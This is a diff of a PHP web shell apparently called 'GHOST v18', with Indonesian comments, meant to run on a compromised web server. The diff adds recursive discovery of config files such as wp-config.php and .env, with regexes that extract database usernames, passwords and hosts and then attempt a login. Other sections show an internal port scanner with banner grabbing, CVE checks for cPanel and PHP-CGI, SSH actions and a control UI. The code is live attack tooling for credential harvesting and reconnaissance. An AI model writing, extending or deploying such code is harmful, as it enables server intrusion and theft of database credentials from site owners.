@@ -1,11 +1,10 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - section 0..5: Full UI (Tab Navigation) + Restored Scanners.
+// GHOST v18 - section 0..6: Full UI, Fix JSON, Advanced DB, Deep Scan.
 
-define('GH_VER',      '18.0.0-s5-full');
+define('GH_VER',      '18.0.0-s6');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
-define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
 
 @ini_set('display_errors', '0');
@@ -281,27 +280,42 @@ function gh_vuln_scan() {
     return $vulns;
 }
 
-// ==== SECTION 4: DB HARVEST & SSH ===========================================
+// ==== SECTION 4: ADVANCED DB HARVEST & SSH ==================================
 function gh_db_harvest() {
     $logs = array(); $info = array(); $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
-    $configs = array(
-        $root . '/wp-config.php' => array('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', '/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', '/(?:DB_HOST|host)\s*[=\'"]+\s*([^\'";\s]+)/i'),
-        $root . '/.env' => array('/DB_USERNAME\s*=\s*([^\s]+)/i', '/DB_PASSWORD\s*=\s*([^\s]+)/i', '/DB_HOST\s*=\s*([^\s]+)/i'),
-        $root . '/configuration.php' => array('/public \$user\s*=\s*\'([^\']+)\'/i', '/public \$password\s*=\s*\'([^\']+)\'/i', '/public \$host\s*=\s*\'([^\']+)\'/i')
-    );
-    $db_host = 'localhost'; $db_user = ''; $db_pass = '';
-    foreach ($configs as $cf => $regex) {
-        if (@is_file($cf)) {
-            $c = gh_read($cf);
-            if ($c) {
-                $logs[] = "[+] Config ditemukan: $cf";
-                if (preg_match($regex[0], $c, $m)) $db_user = $m[1];
-                if (preg_match($regex[1], $c, $m)) $db_pass = $m[1];
-                if (preg_match($regex[2], $c, $m)) $db_host = $m[1];
-                if ($db_user && $db_pass) break;
+    
+    // Auto-discovery: Cari file config secara recursive (max depth 3)
+    $found_configs = array();
+    $stack = array($root);
+    $depth = 0;
+    while ($stack && $depth < 3) {
+        $current = array_pop($stack);
+        $files = @scandir($current);
+        if (!$files) continue;
+        foreach ($files as $f) {
+            $path = $current . '/' . $f;
+            if (is_dir($path) && $f !== '.' && $f !== '..' && $f !== 'node_modules' && $f !== 'vendor') { $stack[] = $path; $depth++; }
+            elseif (preg_match('/^(wp-config|configuration|config|database|settings|env|\.env)(\.php|\.inc|\.json|\.xml)?$/i', $f)) {
+                $found_configs[] = $path;
             }
         }
     }
+
+    $db_host = 'localhost'; $db_user = ''; $db_pass = '';
+    foreach ($found_configs as $cf) {
+        $c = gh_read($cf);
+        if ($c) {
+            $logs[] = "[+] Config ditemukan: $cf";
+            // Pola User
+            if (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];
+            // Pola Pass
+            if (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = $m[1];
+            // Pola Host
+            if (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = $m[1];
+            if ($db_user && $db_pass) break;
+        }
+    }
+    
     if ($db_user) {
         $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
         $logs[] = "[*] Mencoba koneksi ke $db_host dengan user $db_user...";
@@ -375,13 +389,14 @@ function gh_ssh_action($action, $key) {
     return "Aksi tidak dikenal.";
 }
 
-// ==== SECTION 5: PORT SCAN & CVE PROFILER ===================================
+// ==== SECTION 5: PORT SCAN (FIXED) & CVE PROFILER ===========================
 function gh_port_scan($target = '127.0.0.1', $ports = null, $timeout = 0.3) {
     if (!$ports) {
         $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
     }
     $open = array();
     foreach ($ports as $p) {
+        // Dibungkus @ (suppress warning) biar gak ngerusak JSON
         $fp = @fsockopen($target, $p, $en, $es, $timeout);
         if ($fp) {
             $banner = '';
@@ -413,16 +428,13 @@ function gh_cve_profile() {
         $profile['stack'][] = 'cPanel ' . trim($c ?: '(versi unknown)');
         if ($c && version_compare(trim($c), '110.0.20', '<')) $profile['cves'][] = 'CVE-2023-29489 (cPanel XSS - fixed in 110.0.20)';
     }
-
     if (stripos($_SERVER['SERVER_SOFTWARE'] ?? '', 'LiteSpeed') !== false) {
         $profile['stack'][] = 'LiteSpeed ' . ($_SERVER['SERVER_SOFTWARE'] ?? '');
     }
-
     $profile['stack'][] = 'PHP ' . PHP_VERSION;
     if (version_compare(PHP_VERSION, '8.3.8', '<') && version_compare(PHP_VERSION, '8.1.0', '>=')) {
         $profile['cves'][] = 'CVE-2024-4577 (PHP CGI Argument Injection - fixed in 8.3.8)';
     }
-
     return $profile;
 }
 
@@ -459,7 +471,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION) ===================================================
+// ==== UI (TAB NAVIGATION - FULL) ============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -508,7 +520,7 @@ function gh_ui() {
 </head>
 <body>
 <div class="box">
-    <h2>GHOST v18 / Section 5</h2>
+    <h2>GHOST v18 / Section 6</h2>
     <div class="row">
         <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
         <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
